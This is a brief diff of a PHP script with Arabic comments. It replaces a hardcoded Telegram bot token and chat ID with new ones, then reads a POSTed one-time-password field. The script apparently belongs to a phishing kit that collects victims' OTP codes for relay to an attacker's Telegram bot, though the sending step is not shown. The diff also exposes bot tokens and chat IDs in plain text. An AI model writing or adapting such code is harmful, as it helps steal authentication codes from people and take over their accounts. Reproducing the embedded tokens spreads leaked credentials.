@@ -1,7 +1,7 @@
 <?php
 // إعدادات تيليجرام
-$botToken = "8336961082:AAGqlFilNFcN-NVMrzWGeut7JhLd_yZqOkc";
-$chatId = "8535558521";
+define('BOT_TOKEN', '8556962941:AAHlKkhTEHidZgmI88cTJtKxrsVoHbzsj6A');
+define('CHAT_ID', '8053385893');
 
 // استقبال البيانات
 $otp_code_first = isset($_POST['otp_code_first']) ? $_POST['otp_code_first'] : '';
